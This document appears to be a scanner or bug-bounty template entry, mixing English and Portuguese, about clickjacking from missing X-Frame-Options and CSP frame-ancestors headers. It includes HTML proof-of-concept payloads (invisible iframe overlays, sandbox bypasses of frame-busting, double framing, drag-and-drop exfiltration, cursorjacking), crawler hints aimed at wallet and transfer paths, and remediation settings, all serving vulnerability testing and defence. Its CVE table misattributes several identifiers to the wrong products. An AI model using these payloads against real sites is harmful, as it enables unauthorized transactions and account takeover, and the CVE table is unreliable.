---
id: clickjacking
title: "Clickjacking - Missing Frame Protection"
module: "clickjacking"
severity: "HIGH"
cwe_id: "CWE-1021"
cwe_title: "Improper Restriction of Rendered UI Layers"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
vrt_id: "clickjacking.non_sensitive_action"
---

## Summary
The application can be loaded inside an iframe on attacker-controlled domains due to missing X-Frame-Options and CSP frame-ancestors headers, enabling clickjacking attacks.

## Description
Clickjacking (UI Redress Attack) occurs when an attacker embeds the target application in a transparent or disguised iframe on a malicious page. The victim interacts with what they believe is the attacker's page, but their clicks and keystrokes are actually directed to the hidden target application.

Frame protection is provided by two complementary mechanisms:
- X-Frame-Options header (DENY or SAMEORIGIN) -- legacy but widely supported
- Content-Security-Policy frame-ancestors directive -- modern, more flexible

When both are absent, any domain can embed the target in an iframe. The attack is especially dangerous for applications with:
- Wallet connection flows (cryptocurrency exchanges, DeFi)
- One-click actions (transfer funds, approve transactions)
- Session-authenticated state-changing operations
- Form submissions with pre-filled or hidden fields

JavaScript frame-busting code is unreliable as a defense due to sandbox attribute bypasses and race conditions.

## Impact
- Unauthorized wallet connections and transaction signing
- One-click fund transfers to attacker-controlled addresses
- Account setting changes (email, password, 2FA)
- Social actions performed without user awareness
- Data exfiltration via UI manipulation

## Payloads and Bypasses
PoC basico de clickjacking:
```html
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<h1>Click the button below</h1>
<iframe src="https://TARGET/" style="opacity:0.0001;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;"></iframe>
<button style="position:relative;z-index:1;">Click me for a prize!</button>
</body>
</html>
```

Bypass de sandbox para frame-busting JS:
```html
<!-- sandbox sem allow-scripts desabilita JS frame-busting -->
<iframe src="https://TARGET/" sandbox="allow-forms allow-same-origin"></iframe>
<!-- sandbox com allow-top-navigation permite redirecionamento -->
<iframe src="https://TARGET/" sandbox="allow-forms allow-scripts allow-top-navigation"></iframe>
```

Tecnicas avancadas:
```html
<!-- Double framing bypass -->
<iframe src="https://ATTACKER/frame2.html"></iframe>
<!-- frame2.html contains: <iframe src="https://TARGET/"></iframe> -->

<!-- Drag-and-drop clickjacking (exfiltracao de dados) -->
<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','evil')">
Drag this
</div>
<iframe src="https://TARGET/settings"></iframe>

<!-- Cursor jacking (mover cursor visual para enganar) -->
<div style="cursor:none;">
<div style="position:absolute;pointer-events:none;" id="fakeCursor"></div>
<iframe src="https://TARGET/"></iframe>
</div>
```

## Target Context (Crawler Hints)
- **Parameters:** `action`, `confirm`, `approve`, `submit`, `transfer`, `connect`, `authorize`
- **Paths:** `/login`, `/signin`, `/auth`, `/account`, `/wallet`, `/connect`, `/swap`, `/trade`, `/transfer`, `/withdraw`, `/deposit`, `/approve`, `/confirm`, `/checkout`, `/payment`, `/settings`, `/profile`, `/admin`, `/dashboard`

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2021-22873 | Revive Adserver | 2021 | Clickjacking no painel de administracao -- falta de X-Frame-Options permitia manipulacao de campanhas | Admin panel clickjacking |
| CVE-2023-24816 | IPython | 2023 | Clickjacking no notebook web UI -- permite execucao de codigo arbitrario via iframe | Code execution via UI redress |
| CVE-2021-21287 | MinIO Console | 2021 | Missing X-Frame-Options no console web -- permite clickjacking para manipulacao de buckets | Storage admin clickjacking |
| CVE-2024-6387 | Roundcube Webmail | 2024 | Frame injection no compose window -- permite phishing via UI overlay | Email compose hijacking |
| CVE-2022-24785 | Grafana | 2022 | Clickjacking no painel de administracao por falta de frame-ancestors em CSP | Dashboard clickjacking |

## Escalation Techniques
- **Wallet connection hijacking:** em plataformas crypto/DeFi, sobrepor iframe transparente sobre botao "Connect Wallet" -- vitima conecta wallet ao contrato do atacante pensando estar na plataforma legítima.
- **One-click transaction:** sobrepor botao de "Approve" ou "Transfer" com iframe invisível -- vitima clica no que parece ser conteudo do atacante mas executa transacao real.
- **Account setting changes:** clickjacking em pagina de settings para alterar email, senha ou desabilitar 2FA -- atacante ganha acesso permanente a conta.
- **Likejacking/social actions:** em redes sociais ou plataformas com acoes sociais, forcar likes, follows, shares sem conhecimento do usuario.
- **Encadeamento com CSRF:** clickjacking remove a necessidade de token CSRF -- a vitima faz o request autenticado diretamente ao clicar no iframe.
- **Drag-and-drop data exfiltration:** tecnica avancada onde a vitima arrasta conteudo do iframe para area do atacante, extraindo tokens CSRF, dados de sessao ou informacoes pessoais.

## Hunting Methodology
1. Verificar headers HTTP da pagina principal e de paginas sensíveis -- buscar `X-Frame-Options` e `Content-Security-Policy: frame-ancestors` na resposta.
2. Testar se a aplicacao pode ser embedded em iframe: criar HTML local com `<iframe src="https://target/">` e abrir no browser.
3. Mapear paginas com acoes sensíveis (login, transfer, settings, approve) -- estas sao os alvos de maior impacto para clickjacking.
4. Verificar se JS frame-busting existe no source (`top !== self`, `top.location`, `parent.location =`) -- se presente, testar bypass com `sandbox` attribute.
5. Testar consistencia: verificar se TODAS as paginas tem protecao, nao apenas a raiz -- paginas de erro (404) e assets estaticos frequentemente nao tem headers.
6. Verificar pagina de erro customizada (probe `/anarcry-404-probe`) -- se a 404 tambem nao tem frame protection, e vulneravel.
7. Gerar PoC HTML demonstrando o impacto para o report.

## False Positive Indicators
- Aplicacao retorna 403 com JS challenge (Cloudflare, Akamai) -- WAF bloqueia embedding, nao e vulneravel mesmo sem headers.
- JS frame-busting presente e funcional (top !== self com redirect) -- defesa parcial, mas bypass possivel com sandbox. Reportar como LOW, nao HIGH.
- Pagina nao tem acoes sensíveis (pagina puramente informativa sem sessao) -- clickjacking sem impacto real. Avaliar se ha formularios ou acoes state-changing.
- X-Frame-Options presente mas com valor ALLOW-FROM (deprecated) -- verificar se o browser da vitima suporta o header. Browsers modernos ignoram ALLOW-FROM.
- CSP frame-ancestors permite dominios especificos -- nao e vulneravel a embedding generico, apenas pelos dominios listados. Verificar se os dominios permitidos sao confiáveis.
- SPA com client-side routing que mostra conteudo diferente dentro vs fora de iframe -- o embedding pode funcionar mas o conteudo nao e o esperado pela vitima.

## Recommendation
1. Configurar `X-Frame-Options: DENY` em TODAS as respostas HTTP (ou `SAMEORIGIN` se embedding no mesmo dominio e necessario).
2. Configurar `Content-Security-Policy: frame-ancestors 'none'` (ou `'self'`) como defesa primaria -- tem precedencia sobre X-Frame-Options em browsers modernos.
3. Aplicar headers em TODAS as paginas, incluindo error pages, assets estaticos e respostas de API -- a ausencia em qualquer pagina e exploitavel.
4. Para Nginx: `add_header X-Frame-Options "DENY" always;` e `add_header Content-Security-Policy "frame-ancestors 'none'" always;`
5. Para Apache: `Header always set X-Frame-Options "DENY"` e `Header always set Content-Security-Policy "frame-ancestors 'none'"`
6. Para frameworks JS (Vercel, Nuxt, Next): configurar headers no arquivo de configuracao (`vercel.json`, `nuxt.config.ts`, `next.config.js`).
7. Nao depender exclusivamente de JavaScript frame-busting como defesa -- e contornavel com atributo `sandbox` no iframe.
8. Implementar CSRF tokens como defesa em profundidade para acoes sensiveis, independente de frame protection.
